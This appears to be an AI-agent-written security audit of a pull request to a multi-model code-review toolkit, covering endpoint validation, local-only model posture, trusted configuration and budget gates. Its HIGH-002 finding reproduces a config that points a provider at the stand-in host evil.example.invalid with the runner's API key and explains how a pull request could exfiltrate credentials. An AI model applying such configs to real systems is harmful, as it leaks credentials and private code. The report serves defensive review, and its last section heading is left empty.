# Security & Quality Audit Report — Sprint 1 (PR sprint-257)

**Auditor:** Paranoid Cypherpunk Auditor
**Date:** 2026-10-22
**Scope:** The pull request under `pr/` — `pr/head.diff` (80 files, base → head): the per-provider insecure-endpoint opt-in and keyless providers on the cheval path (`endpoint_policy.py`, `endpoint-validator.py`, `TransportPolicy`), thinking-trace stripping and `response_format` on the OpenAI chat path, catalog price provenance and the catalog-priced dissent budget gate, advisory voices, the `hounfour.locality: local_voices` posture across the dissent, Flatline, Bridgebuilder and the health probe, Bridgebuilder's trusted configuration and DEGRADED exit code, and the six Python / six bats / three TypeScript test suites. Findings are cited as `head/<path>:<line>` with lines from `pr/head/`.
**Methodology:** Systematic 5-category review (Security, Architecture, Code Quality, DevOps; Blockchain not applicable), recon + investigate pass over the diff, reproductions against the head files on an exec-capable overlay under `$HOME`, and the Phase 1C security dissent (`adversarial-review.sh --type audit --diff-file pr/head.diff`).

---

## Pre-flight and scope notes

- **Prerequisite not met.** `grimoires/loa/a2a/sprint-1/engineer-feedback.md` ends `**Verdict:** CHANGES REQUIRED` (trailer: `high: 2, medium: 6, low: 8, excluded: 0`), not `All good`. The skill's Phase 0 says to stop here; the orchestrator instructed the audit to run regardless, so it ran, and this file records the audit — but the sprint cannot be COMPLETED on either gate's verdict. No `COMPLETED` marker is written.
- `adversarial-review.json` carries `metadata.model: gpt-5.5-pro` (the review's dissent ran), so the `COMPLETED`-gate check for the review's Phase 2.5 is satisfied.
- `grimoires/loa/known-failures.md` is absent (the SessionStart hook said so); triage ran without it.
- Integrity pre-check: `.loa.config.yaml` has no `integrity_enforcement` key (warn-equivalent); no System-Zone drift was acted on. Guardrails pre-check: `PROCEED`.
- Scope script (`security-audit-scope.sh --json` over `pr/head/`): 0 HTTP sources, 23 sinks (12 command-exec, 9 file-op, 2 query-shaped). The sinks that matter are the model-dispatch paths (cheval → provider endpoint), `curl` in the probe, `git`/`gh`/`yq` in Bridgebuilder's trusted-config loader, and the `python3 -I` helpers the shell planners call.
- Not run: Bridgebuilder TypeScript tests and `tsc` (no `node_modules` in the snapshot). The review ran the Python and bats suites on an overlay (123 pytest, 50 bats passing); I reused that overlay (`$HOME/headtree.PkUbcj`, byte-identical to `pr/head/` on every file I cite) for reproductions and did not re-run the suites.

---

## Executive Summary

The endpoint rule itself is sound and well tested: `check_insecure_optin` refuses booleans, DNS names, link-local, metadata and ULA addresses, `validate_declared_endpoint` keeps the cycle-099 refusals for every other host, and `TransportPolicy` (no proxy env, no redirects, declared path prefix) is exercised against a real loopback stub on both transports. Keyless providers send no credential at all. The advisory-voice block is isolated from the counted envelope by construction and the byte-identity test (ADV-2) proves it. Bridgebuilder's trusted-config loader validates ref names before they reach `git`, reads the base ref via `ls-tree` + `show`, and fails closed to "no keyless/insecure provider admitted" when no trusted source answers.

Two findings block. First, the `local_voices` posture is decided by the `dispatch_group: local` **label** in every classifier (hop-locality.py, Bridgebuilder's `isLocalVoice`, MODELINV's `hop_locality_of`) and the loader never checks that a `local`-labelled provider's endpoint host passes the loopback/RFC1918/`localhost` rule the opt-in already encodes. Reproduced on head: a provider at `https://api.acme.example/v1` whose model says `dispatch_group: local` loads without refusal, is classified `local` by the planner, and its MODELINV row records `hop_locality: local` with `destination.host: api.acme.example`. Second, Bridgebuilder's new "trusted configuration" gates only which voices are *planned*; every voice is still dispatched by cheval, which reads the checkout's `.loa.config.yaml` from `process.cwd()`, and the head cheval loader admits an arbitrary https endpoint for a built-in provider (reproduced: `openai.endpoint: https://evil.example.invalid/v1` with `{env:OPENAI_API_KEY}` loads). The head-only refusal compares the *presence* of `keyless`/`allow_insecure_endpoint`, so on a PR-head checkout a head that keeps those flags and re-points the endpoint, or re-declares `openai` with a hostile https host, is admitted and dispatched with the runner's credential — while SKILL.md now claims the keys "follow the trusted-source precedence … even when the checkout is a PR head". That exposure predates this change; the false claim does not.

Five medium findings follow: cheval itself never enforces the posture (only the four shell/TS planners do) and its loader never validates the `hounfour.locality` value; the documentation says the health probe "refuses a hosted probe under `local_voices`" but `model-health-probe.sh` contains no locality code at all; the probe applies the hosted host allowlist to configured providers, so the PR's own Azure example cannot be probed; the budget gate now prices every planned voice at catalog rates while the default `budget_cents: 150` and its "ONE dissent call" comment are unchanged (a 100 KB diff at the repository's configured `gpt-5.5-pro` estimates 137c against the old 39c); and `dispatcher.sh` records any exit 3 as a completed-degraded review without checking that a run JSON exists. Nine low findings are listed. The dissent's companion voice raised six findings; each is triaged below against head (the primary returned clean).

**Overall Risk Level:** HIGH (gate verdict: CHANGES_REQUIRED)

**Key Statistics:**
| Severity | Count |
|----------|-------|
| Critical | 0 |
| High | 2 |
| Medium | 5 |
| Low | 9 |

---

## Category Scores (Rubric-Based Assessment)

**Scoring Method:** Each dimension scored 1-5 per `resources/RUBRICS.md`

| Category | Score | Dimensions |
|----------|-------|------------|
| Security | 3.2/5 | IV:4 AZ:3 CI:4 IN:2 AV:3 |
| Architecture | 3.8/5 | MO:4 SC:4 RE:4 CX:3 ST:4 |
| Code Quality | 4.0/5 | RD:4 TC:5 EH:4 TS:4 DC:3 |
| DevOps | 3.4/5 | AU:4 OB:4 RC:3 AC:3 DS:3 |
| Blockchain | n/a | *(not applicable)* |
| **Overall** | **3.5/5** | *Security weighted ×2* |

Security IN (integrity) is 2 because both HIGH findings are integrity failures: a label stands in for a verified property (HIGH-001) and a documented control does not bind the dispatch it claims to govern (HIGH-002). DC (documentation) is 3 for the three doc-vs-code mismatches (SKILL.md:118, scripts-reference.md:73, `.loa.config.yaml.example:1624`).

**Machine-Parseable Output:** `grimoires/loa/a2a/audits/2026-10-22/findings.jsonl`

---

## Critical Issues (Fix Immediately)

None.

---

## High Priority Issues (Fix Before Production)

### [HIGH-001] `local_voices` trusts the `dispatch_group: local` label; the endpoint host is never checked

**Severity:** HIGH | **Confidence:** medium
**Component:** `head/.claude/scripts/lib/hop-locality.py:116`; also `head/.claude/skills/bridgebuilder-review/resources/config.ts:730`, `head/.claude/adapters/loa_cheval/audit/modelinv.py:476`, `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:172`
**Criterion:** SEC-IN (Integrity) / SEC-AZ (Authorization)

**Reasoning Trace:**
> Traced the `local_voices` decision from the planners back to its source. `hop-locality.py:116` — `group = entry.get("dispatch_group") or block.get("dispatch_group") or ""` — and `:117` `if group != "local"` is the whole test; the endpoint is never read. `config.ts:726-732` (`isLocalVoice`) reads `modelGroups`/`dispatchGroup` only; `ProviderDecl` does not even carry an endpoint. `modelinv.py:476` — `return "local" if entry.get("dispatch_group") == "local" else "hosted"`. The loader's only label check is `endpoint_policy.py:172`: a *keyless* provider's models must declare *some* `dispatch_group`; nothing ties `local` to the host rule that `check_endpoint` (`:156`) already applies to the same provider. Reproduced on head with `python3 -I pr/head/.claude/scripts/lib/hop-locality.py --catalog pr/head/.claude/defaults/model-config.yaml --config mislabel.yaml -- lr acme:big-hosted` where `acme.endpoint` is `https://api.acme.example/v1`: both rows read `acme	local	dispatch_group=local`. The same config loads through the head cheval loader without refusal (`locality: local_voices`, `acme.endpoint: https://api.acme.example/v1`), and `hop_telemetry("acme:big-hosted", merged)` returns `{'locality_mode': 'local_voices', 'destination': {'host': 'api.acme.example', 'scheme': 'https', 'provider': 'acme'}, 'hop_locality': 'local'}`.

**Description:** Under `hounfour.locality: local_voices` the posture is the only control that keeps the prompt on-host: the opt-in rule does not fire for an https public endpoint, and `TransportPolicy` does engage for a `local`-labelled model (openai_adapter.py:221) but only pins proxy/redirect/path — it happily sends to the declared public host. One mislabelled line in the merged config (a typo, a copy of the Azure example with `dispatch_group: local`, or a hostile edit to the working-tree config) makes adversarial-review.sh, flatline-orchestrator.sh and Bridgebuilder plan the hop, cheval dispatch it to the public host, and the MODELINV row assert `hop_locality: local`. The module docstring of hop-locality.py promises "Fail closed — a hop is never called local because it could not be read"; a hop *is* called local because a label said so. Mitigating: the MODELINV `destination.host` is recorded truthfully, so the discrepancy is detectable after the fact by a reader who compares the two fields.
**Impact:** Confidentiality of the reviewed diff and prompt under a posture whose stated purpose (multi-model-reference.md:102) is "a local posture keeps model calls local"; a false audit assertion (`hop_locality: local`) on the MODELINV chain.
**[ASSUMPTION]** An alternative reading — that `dispatch_group: local` is meant to let an operator declare an on-prem https server with a DNS name "local" — is not what the PR documents (Example 4 and multi-model-reference.md:103 define a local provider by the opt-in host rule). If that reading is intended, the posture must say so and the audit row must not call such a hop `local`.
**Remediation:** Define the local-hop rule once — HTTP provider (not `*-headless`/`kind: cli`) whose endpoint host passes `check_insecure_optin`'s acceptance (loopback, RFC1918, `localhost`) — and (a) refuse a `local` label the endpoint cannot honour in `validate_providers` at load (`[CONFIG-INVALID] providers.<p>.models.<m>: dispatch_group local on a non-local endpoint <host>`), (b) mirror it in `hop-locality.py` (stdlib `ipaddress`, reason `endpoint_not_local:<host>`), (c) carry `endpoint` in `ProviderDecl` and apply it in `isLocalVoice`, (d) apply it in `hop_locality_of`. Add the mislabelled-provider case to `test_config_examples_load.py`, `adversarial-review-locality.bats` and `trusted-config.test.ts`.
**References:** CWE-807 Reliance on Untrusted Inputs in a Security Decision — https://cwe.mitre.org/data/definitions/807.html; CWE-1288 Improper Validation of Consistency within Input — https://cwe.mitre.org/data/definitions/1288.html; SDD D-8.0 / D-8.1.

### [HIGH-002] Bridgebuilder's trusted configuration gates admission only; dispatch still reads the checkout, and SKILL.md claims otherwise

**Severity:** HIGH | **Confidence:** medium
**Component:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:685` (and `:684`); `head/.claude/skills/bridgebuilder-review/resources/main.ts:464`; `head/.claude/skills/bridgebuilder-review/SKILL.md:118`
**Criterion:** SEC-IN (Integrity) / SEC-AZ (Authorization)

**Reasoning Trace:**
> `loadTrustedConfig` builds `headOnlyRefused` from two booleans per provider: `config.ts:684` `keylessOnlyInHead = decl.keyless && t?.keyless !== true` and `:685` `insecureOnlyInHead = decl.insecure && t?.insecure !== true`, where `insecure` is "`allow_insecure_endpoint` is set to any non-null, non-false value" (`:495`). The endpoint, the opt-in host and the `auth` template are never compared between head and trusted view. `config.trusted` (`main.ts:464`) is consulted by `validateApiKeys` (`config.ts:398-409`) and the pipeline's keyless check (`multi-model-pipeline.ts:224-233`), then every voice is created through `createAdapter` → `ChevalDelegateAdapter`, which resolves `cheval.py` as `join(process.cwd(), ".claude/adapters/cheval.py")` (`.claude/skills/bridgebuilder-review/resources/adapters/cheval-delegate.ts:117`, unchanged by the PR); cheval's loader reads the working tree's `.loa.config.yaml` for `hounfour.providers` (endpoint, auth, aliases). Reproduced on head: a project config `hounfour.providers.openai: {endpoint: "https://evil.example.invalid/v1", auth: "{env:OPENAI_API_KEY}"}` loads through the head cheval loader with `openai.endpoint == https://evil.example.invalid/v1` — `validate_declared_endpoint` skips the host allowlist by design (endpoint-validator.py:1289-1296). The base loader had no endpoint validation at all, so the change tightens cheval; the exposure on a PR-head checkout is pre-existing (#1050 closed it as not applicable to the shipped invocation model). What is new is SKILL.md:118: "Since cycle-129 the provider, locality and exit keys follow the trusted-source precedence below even when the checkout is a PR head", and a test suite that models the working tree as the PR head.

**Description:** Two head edits pass the gate and change the dispatch: (1) keep `keyless: true` and `allow_insecure_endpoint` on a trusted local provider but re-point its `endpoint` to another host (an https host is admitted by cheval's declared-endpoint rule); (2) re-declare a built-in provider (`openai`) with a hostile https `endpoint` and `auth: "{env:OPENAI_API_KEY}"` — no keyless, no opt-in, so `headOnlyRefused` is empty, `providerKeyEnv` returns the built-in env var, the pipeline sees the key present, and cheval sends the prompt and the runner's `OPENAI_API_KEY` to the head's host. The startup line meanwhile prints `Trusted config: base-ref …`.
**Impact:** Where Bridgebuilder is run on a PR-head checkout — which SKILL.md:118 now describes as covered — a pull request can exfiltrate a runner credential and the review prompt. Under the shipped no-head-checkout model the impact is the false assurance only.
**Remediation:** Either (a) on a pull request, compute the drift between the head's and the trusted `hounfour.providers` (endpoint, auth, opt-in host, keyless, dispatch_group), `hounfour.aliases`, `hounfour.locality` and `secret_env_allowlist`, and refuse the multi-model run with a distinct exit code when they differ; or (b) write the trusted config text to a temp file and hand it to cheval (`LOA_CONFIG_PATH_OVERRIDE`-style) so the dispatch reads what the gate read. In both cases compare the opt-in *host* and the endpoint, not a boolean, and state the invocation model the protection assumes in SKILL.md (or revert line 118 to the #1050 wording).
**References:** CWE-345 Insufficient Verification of Data Authenticity — https://cwe.mitre.org/data/definitions/345.html; OWASP A08:2021 Software and Data Integrity Failures — https://owasp.org/Top10/A08_2021-Software_and_Data_Integrity_Failures/; SDD D-7.5, DEC-0170.

---

## Medium Priority Issues (Address in Next Sprint)

### [MED-001] cheval never enforces `local_voices` itself and never validates the `hounfour.locality` value

**Severity:** MEDIUM | **Confidence:** high
**Component:** `head/.claude/adapters/cheval.py:1813`; `head/.claude/adapters/loa_cheval/audit/modelinv.py:468`
**Description:** cheval plans around the agy opt-in (`_plan_around_agy`, cheval.py:1813) but never around `hounfour.locality`; it only *records* `locality_mode` (`hop_telemetry` at the emit sites). Any caller other than the four patched planners — a direct `cheval invoke --model gpt-5.5`, a skill's own model call, Flatline's red-team pipeline (refused by the orchestrator, not by cheval) — dispatches a hosted hop under the posture, and a local alias whose catalog `fallback_chain` names a hosted entry is walked inside one call (hop-locality.py's planner-side chain check is not consulted by cheval; no load-time check exists in head). The loader also never validates the value: `locality_mode_of` (modelinv.py:466-471) returns `None` for an unknown string and the row silently omits `locality_mode`, while the planners refuse the value — two behaviours for one key.
**Impact:** The posture's guarantee holds only for the four planners; the audit trail can omit the mode without a refusal.
**Remediation:** Validate `hounfour.locality` in `load_config` (refuse anything but `hosted`/`local_voices`), and under `local_voices` make cheval refuse a hop whose `hop_locality` is not `local` (reason `locality_refused`, `failure_class`), including fallback-chain hops.
**References:** CWE-693 Protection Mechanism Failure — https://cwe.mitre.org/data/definitions/693.html.

### [MED-002] Documentation claims the health probe refuses hosted probes under `local_voices`; the probe has no locality code

**Severity:** MEDIUM | **Confidence:** high
**Component:** `head/.claude/loa/reference/scripts-reference.md:73`; `head/.claude/loa/reference/multi-model-reference.md:102`; `head/.claude/scripts/model-health-probe.sh:1434` (`_probe_configured`)
**Description:** scripts-reference.md:73 states the probe "refuses a hosted probe under `local_voices`", and multi-model-reference.md:102 lists "health-probe hops" among those "planned only on providers whose model entry says `dispatch_group: local`" (the config comment at `.loa.config.yaml.example:818` says the same). `grep -n -i 'locality\|local_voices' head/.claude/scripts/model-health-probe.sh` returns nothing: neither `_probe_configured` nor the built-in `_probe_openai`/`_probe_anthropic`/… paths read `hounfour.locality`. Under the posture `model-health-probe.sh --provider openai` still sends the operator's `OPENAI_API_KEY` to `api.openai.com`.
**Impact:** A documented security control does not exist; an operator relying on the reference believes the posture covers the probe.
**Remediation:** Either implement the gate (read `hounfour.locality` via the same yq tag check the planners use; refuse built-in providers and any configured provider whose models are not `dispatch_group: local`, with the one refusal sentence) and cover it in `model-health-probe-configured-provider.bats`, or remove the claim from both references and the example comment.
**References:** CWE-1059 Insufficient Technical Documentation — https://cwe.mitre.org/data/definitions/1059.html.

### [MED-003] The probe applies the hosted host allowlist to configured providers; the PR's own Azure example is refused

**Severity:** MEDIUM | **Confidence:** high
**Component:** `head/.claude/scripts/model-health-probe.sh:1475` (flags at `:1469`)
**Description:** `_probe_configured` validates `<endpoint>/models` with `endpoint_validator__check --json --allowlist "$PROBE_PROVIDERS_ALLOWLIST"`, i.e. `validate()` with `_declared_endpoint=False`, which runs step 8 (the host/port allowlist, endpoint-validator.py:1298). The cheval loader deliberately skips that step for operator-declared endpoints (`validate_declared_endpoint`, :1289). So a configured https provider that is not on `loa-providers.json` — the PR's Example 3 `myresource.openai.azure.com`, any hosted open-weight API — loads in cheval but the probe reports `UNKNOWN / endpoint refused: [ENDPOINT-NOT-ALLOWED]` (the review reproduced it with the head probe; the code path is unambiguous). Only loopback/RFC1918 opt-in hosts and allowlisted hosts are probeable, which scripts-reference.md:73 does not say.
**Impact:** Availability of the documented feature for the documented example; misleading `UNKNOWN` state.
**Remediation:** Give the probe the declared-endpoint semantics (a `--declared-endpoint` flag on the validator CLI that maps to `validate_declared_endpoint`), or document the limit.

### [MED-004] The budget gate was recalibrated; the default `budget_cents: 150` and its "ONE dissent call" comment were not

**Severity:** MEDIUM | **Confidence:** high
**Component:** `head/.claude/scripts/adversarial-review.sh:4335` (estimate at `:4333`); `head/.loa.config.yaml.example:1624`, `:1690`
**Description:** The estimate now sums primary + the companion's first hop + each advisory voice at catalog prices. With the head catalog (`python3 -m loa_cheval.metering.pricing`): `gpt-5.3-codex` 1.75/14 USD per Mtok, `gpt-5.5-pro` 30/180, `claude-headless` 10/50. For a 100 KB diff (33,833 estimated tokens) the primary alone estimates 7c at the example's `gpt-5.3-codex` but 137c at this repository's configured `gpt-5.5-pro`, against the old fixed-formula 39c; adding the default companion `claude-headless` (≈ 43c) puts the two-voice estimate at ≈ 180c, over the unchanged example default of 150c, and the run is refused with `budget_exceeded` (exit 4) before any dispatch. Both example comments still describe the key as a gate on "ONE dissent call's pre-dispatch cost estimate". (This repository's `.loa.config.yaml` sets 200 with `budget_cents_max: 1200` and the run here estimated 1146c effective, so it passed.)
**Impact:** Review and audit gates refused on moderately sized diffs for operators on the example default with a premium primary; the config comment misdescribes the gate.
**Remediation:** Update the two comments to "every planned voice at its catalog price"; raise the example default or document the per-primary calibration; add a Migration note.

### [MED-005] `dispatcher.sh` accepts any exit 3 as a completed-degraded review without a run JSON

**Severity:** MEDIUM | **Confidence:** medium
**Component:** `head/.claude/skills/scheduled-cycle-template/contracts/session-cap-bb/dispatcher.sh:78` (`:89` exits 0; entry override at `:57`)
**Description:** `if [[ "$rc" -eq 3 ]]` sets `degraded=true`, prints the WARN and exits 0 with no check that `$BB_OUT` holds a run JSON with a `verdicts` array. `LOA_SESSION_CAP_BB_ENTRY` (`:57`) may point at a pre-cycle-129 `entry.sh`, whose missing-`node_modules/zod` preflight exits 3; a review that never ran is then recorded as completed-degraded and the scheduled cycle proceeds. `spiral-harness.sh`'s `_bb_surface_exit` has the same shape but was already non-blocking (`|| true` before), so only the dispatcher changes an outcome.
**Impact:** A silently skipped review in the unattended session-cap flow.
**Remediation:** Treat 3 as completion only when `jq -e '.verdicts | type == "array"' "$BB_OUT"` succeeds; otherwise keep it a failure and say why.
**References:** CWE-754 Improper Check for Unusual or Exceptional Conditions — https://cwe.mitre.org/data/definitions/754.html.

---

## Low Priority Issues (Technical Debt)

### [LOW-001] `localhost` is an admitted opt-in host while the rule text says the host "is never resolved"

**Severity:** LOW | **Confidence:** medium
**Component:** `head/.claude/scripts/lib/endpoint-validator.py:1047` (text at `:999`, `:1054`); `head/.claude/adapters/loa_cheval/providers/base.py:138`
**Description:** `check_insecure_optin` returns `localhost` as a valid opt-in host; `TransportPolicy.check_url` compares the string host; httpx, urllib and curl then resolve `localhost` through the system resolver (`/etc/hosts`, then DNS under `hosts: files dns` where the name is absent from the file). The example's threat model ("never resolved through DNS … cannot be rebound") is true for IP literals only. (Dissent DISS-C-003 of the review's run; this run's companion did not raise it.)
**Remediation:** Drop `localhost` from the opt-in (the example can use `127.0.0.1`), or resolve it at request time and require every address to be loopback; fix the rule text either way.
**References:** CWE-350 Reliance on Reverse DNS Resolution for a Security-Critical Action (closest) — https://cwe.mitre.org/data/definitions/350.html.

### [LOW-002] The "named refusal" names two different things

**Severity:** LOW | **Confidence:** high
**Component:** `head/.claude/adapters/loa_cheval/providers/base.py:1121`; `head/.claude/adapters/cheval.py:1946`
**Description:** `enforce_context_window` uses `meta.get("alias") or request.model`, but the `CompletionRequest.metadata` cheval builds (cheval.py:1946-1949) carries `agent` and `output_schema_name` only — never `alias` — so the exception and stderr say `for qwen3-coder-30b` while the MODELINV `message_redacted` (built separately from `_primary_alias`, cheval.py:2553) says `for local-reviewer`.
**Remediation:** Put `alias` into the request metadata where the request is built, or derive the message once.

### [LOW-003] An unterminated leading `<think>` swallows the whole answer

**Severity:** LOW | **Confidence:** medium
**Component:** `head/.claude/adapters/loa_cheval/providers/openai_streaming.py:77`
**Description:** `strip_thinking_blocks` treats an unclosed leading `<think>` as "the rest is reasoning" (`rest = ""`). A server that emits the answer after an unclosed tag yields empty content, `malformed_response` and a repair round instead of the answer.
**Remediation:** Strip only up to a recognisable answer start (the first `{` for a JSON-schema call) or record the case as its own status.

### [LOW-004] An undeclared provider is recorded with the "no network" destination

**Severity:** LOW | **Confidence:** high
**Component:** `head/.claude/adapters/loa_cheval/audit/modelinv.py:445`
**Description:** `destination_for` returns `{host: cli-subprocess, scheme: cli}` whenever the provider has no `endpoint`, including a provider absent from `hounfour.providers` (`prov == {}`). Reproduced: `hop_telemetry("ghost:none", merged)` → `destination: {'host': 'cli-subprocess', 'scheme': 'cli', 'provider': 'ghost'}`. (Dissent DISS-C-002 overlaps; see triage.)
**Remediation:** Record `unknown` for a provider or endpoint that is not declared.

### [LOW-005] Bridgebuilder and cheval disagree on what a literal `auth` means

**Severity:** LOW | **Confidence:** high
**Component:** `head/.claude/skills/bridgebuilder-review/resources/config.ts:482` (used at `:491`); `head/.claude/adapters/loa_cheval/config/endpoint_policy.py:50`
**Description:** Bridgebuilder treats any literal `auth` string (no `{env:`) as keyless; cheval normalises only the literal `local` ("any other literal could be a real key"). A pasted key in `auth` needs no env var in Bridgebuilder and is a credential in cheval.
**Remediation:** Align `literalAuth` with `KEYLESS_AUTH_LITERALS` (`local` only).

### [LOW-006] Bridgebuilder's `local_voices` run is never DEGRADED while the dissent's always is

**Severity:** LOW | **Confidence:** high
**Component:** `head/.claude/skills/bridgebuilder-review/resources/main.ts:488`; `head/.claude/skills/bridgebuilder-review/resources/core/multi-model-pipeline.ts:490`
**Description:** Voices refused by locality are removed from `multiModelConfig.models` before the pipeline computes `voicesPlanned`, so a one-local-voice run completes 1/1 and exits 0, while adversarial-review.sh declares every one-family audit `DEGRADED_SECURITY_REVIEW` under the same posture (`_ADV_LOC_DEGRADED_SENTENCE`).
**Remediation:** State which semantics the posture has; if "fewer voices means DEGRADED" (multi-model-reference.md:102), count refused voices as planned-and-incomplete.

### [LOW-007] The planners honour a provider-block `dispatch_group: local` that the cheval loader refuses

**Severity:** LOW | **Confidence:** high
**Component:** `head/.claude/scripts/lib/hop-locality.py:116`; `head/.claude/skills/bridgebuilder-review/resources/config.ts:730`; `head/.claude/adapters/loa_cheval/config/loader.py:1025`
**Description:** hop-locality.py and `isLocalVoice` fall back to the provider block's `dispatch_group`; cheval's `ModelConfig.dispatch_group` (cheval.py:541) and `hop_locality_of` read the model entry only. Reproduced: a provider with a block-level `dispatch_group: local` and no model-level key is classified `local` by hop-locality.py, but the head cheval loader refuses the whole config at `_validate_model_auth_metadata` (`[CONFIG-INVALID] providers.corp.models.qwen is missing required 'dispatch_group'`). So the dissent's DISS-C-001 scenario (dispatch without the TransportPolicy, row says `hosted`) does not occur on head — cheval refuses to run — but the planner and the loader disagree on a config shape, and a model-level non-`local` group always wins, so the provider-block fallback is dead code on the cheval path.
**Remediation:** Drop the provider-block fallback from the planners, or make the loader honour it; one rule.

### [LOW-008] A real credential may travel in clear text to an opted-in `http://` host with no warning

**Severity:** LOW | **Confidence:** medium
**Component:** `head/.claude/adapters/loa_cheval/providers/openai_adapter.py:173` (and `:856`); `head/.loa.config.yaml.example:1236`
**Description:** The opt-in admits plain http to a loopback/RFC1918 host, and the example tells the operator to use `auth: "{env:LOCAL_LLM_KEY}"` when the server wants a key; nothing warns when a non-keyless provider has an http endpoint, and an allowlisted hosted key (`OPENAI_API_KEY`) can be named just as well. On every request and probe the `Authorization: Bearer` header crosses the LAN segment unencrypted. (Dissent DISS-C-006, confirmed.)
**Remediation:** WARN once at load for a non-keyless provider whose endpoint scheme is `http`; refuse the built-in hosted-provider env vars on such a provider.
**References:** CWE-319 Cleartext Transmission of Sensitive Information — https://cwe.mitre.org/data/definitions/319.html.

### [LOW-009] Documentation and report gaps: CHANGELOG pointer, no AC verification, no fast-gate evidence

**Severity:** LOW | **Confidence:** low
**Component:** `head/README.md:22` (and `:32`); `head/.claude/skills/bridgebuilder-review/dist/.build-manifest.json:4`
**Description:** README.md:22 points at CHANGELOG Migration notes for these features and `:32` tells upgraders to read them, but the change touches no `CHANGELOG.md` (not present in this snapshot — unverifiable). The implementation report (`pr/PR.md` = `reviewer.md`) is the PR title alone: no `## AC Verification`, no `tsc --noEmit` / `npm test` / `check-bb-dist-fresh.sh --check` evidence for the rebuilt `dist/` (manifest `source_hash` updated, 43 files; `dist/config.js` and `dist/main.js` do carry the new symbols, so the build is at least not stale on inspection).
**Remediation:** Add the CHANGELOG entry with the security changes (endpoint rule, keyless, trusted config, exit codes), the AC walkthrough and the fast-gate results to the report.

---

## Observations (not tallied)

- **DISS-C-004 (server-revocable schema enforcement):** a 400 naming `response_format` makes the adapter retry once without the schema. This is SDD §6 as designed, recorded truthfully (`schema_enforced: false`, `schema_rejected_by_server: true`), and the repair loop applies to the unenforced branch. Not a defect; consumers must keep reading `schema_enforced`.
- **DISS-C-005 (percent-encoded traversal past the path-prefix rule):** `check_url` normalises neither `%2e%2e` nor `/./`. Latent: every request URL is built by the adapter from the configured endpoint (`f"{endpoint}/chat/completions"`), so no external value reaches the check. Worth a `unquote` + `posixpath.normpath` when a future caller interpolates a path; not tallied.
- `_adv_budget_estimate` and `_adv_advisory_block` each exceed 50 lines with a large embedded jq program; readable, at the ceiling.

---

## Security Checklist Status

### Secrets & Credentials
- [x] No hardcoded secrets (fixture keys in tests only)
- [x] Keyless providers send no credential (openai_adapter.py:171-173, 854-856; probe `auth_kind=none`)
- [x] `describe-provider` prints the env var *name* only
- [ ] A credential can travel over an opted-in `http://` endpoint without warning (LOW-008)

### Authentication & Authorization
- [ ] `local_voices` locality decided by label, not by the endpoint (HIGH-001)
- [ ] Bridgebuilder trusted config does not bind the cheval dispatch (HIGH-002)
- [x] Head-only keyless / insecure declarations refused by name on a pull request
- [x] Ref names validated before `git` (`isSafeRefName`); `--` separators used

### Input Validation
- [x] Opt-in host: boolean, DNS name, link-local, metadata, ULA, public, port/scheme/userinfo all refused with named codes; one case table on both paths
- [x] Hop names validated (`_adv_conf_advisory_voices` regex) and passed after `--` to `hop-locality.py`
- [x] Provider names for the probe gated by `_CONFIGURED_NAME_RE`
- [ ] `hounfour.locality` value not validated by the cheval loader (MED-001)

### Data Privacy
- [x] Advisory findings isolated under `advisory_voices[]`; rejected payloads never land beside the envelope
- [ ] Prompt can leave the host under `local_voices` via a mislabelled provider (HIGH-001)
- [x] MODELINV records the true `destination.host`

### Supply Chain
- [x] `idna` import made lazy and fail-closed on the cheval path
- [x] `entry.sh` preflight exit renumbered (4) so a missing dependency never reads as a completed review
- [ ] `dist/` freshness not evidenced in the report (LOW-009)

### API Security
- [x] Opted-in / local hops: no proxy env, no redirects, declared path prefix (both transports, tested against a loopback stub)
- [x] One retry only on a server 400 naming `response_format`
- [ ] Health probe allowlist blocks configured https providers (MED-003)

---

## Threat Model Summary

**Trust Boundaries:**
- Operator's merged config (`.claude/defaults/model-config.yaml` + `.loa.config.yaml`) → cheval dispatch: trusted by cheval, now partially validated (endpoint rule, keyless preconditions).
- PR head checkout → Bridgebuilder plan: untrusted by design (D-7.5); → cheval dispatch: still trusted (HIGH-002).
- Model servers (hosted or local) → adapter: untrusted; responses parsed tolerantly, thinking stripped, schema rejection recorded.
- Advisory voices → envelope: untrusted input, isolated block.

**Attack Vectors:**
- Mislabelled or hostile `dispatch_group: local` on a hosted endpoint under `local_voices`: HIGH.
- PR head re-pointing a trusted provider or re-declaring a built-in one on a PR-head checkout: HIGH (pre-existing exposure, newly claimed as closed).
- `localhost` resolver rebinding of the opt-in host: LOW.
- Cleartext credential on an opted-in http LAN endpoint: LOW.

**Mitigations present:** load-time endpoint rule on both paths; `TransportPolicy`; keyless no-credential; head-only refusals; ref-name validation; truthful `destination` telemetry; fail-closed classifier on unreadable config.

**Residual Risks:** the label-vs-host gap; the dispatch-reads-cwd gap; the probe outside the posture.

---

## Positive Findings

- One endpoint rule, one case table, two entry points (`test_endpoint_validator_optin.py` runs 30 cases through the bash-path validator and the cheval path and asserts identical codes).
- Request-time rules proven against a real 127.0.0.1 stub on httpx and urllib, including a dead-proxy control that fails without the policy.
- The advisory block's byte-identity test (ADV-2) normalises and diffs the envelope *and* `verdict-derive --json` output with and without advisory voices.
- `loadTrustedConfig` has injectable I/O seams and a real-git test; `isSafeRefName` rejects option-shaped and `..` names; the base ref is read with `ls-tree` first so a missing file is an empty trusted view, not a failure.
- `entry.sh` moved the preflight exit off 3 before 3 acquired a meaning.
- The MODELINV writer validates `locality_mode` and `hop_locality` enums and the payload schema was extended in the same change.

---

## Recommendations

### Immediate Actions (24 Hours)
1. HIGH-001: refuse a `dispatch_group: local` label whose endpoint host fails the opt-in acceptance rule at load, and apply the same rule in the three classifiers.
2. HIGH-002: either compute head-vs-trusted provider drift on a PR and refuse, or pass the trusted config to cheval; correct SKILL.md:118 until then.

### Short-Term Actions (1 Week)
1. MED-001: validate `hounfour.locality` in `load_config`; make cheval refuse non-local hops under the posture.
2. MED-002 / MED-003: implement or un-document the probe's locality gate; give the probe declared-endpoint semantics.
3. MED-004 / MED-005: fix the budget comments and default; require a run JSON before accepting exit 3.

### Long-Term Actions (1 Month)
1. Fold LOW-001 … LOW-008 into the next sprint's hardening task; add the CHANGELOG and AC walkthrough (LOW-009).

---

## Security Dissenter Analysis (Phase 1C)

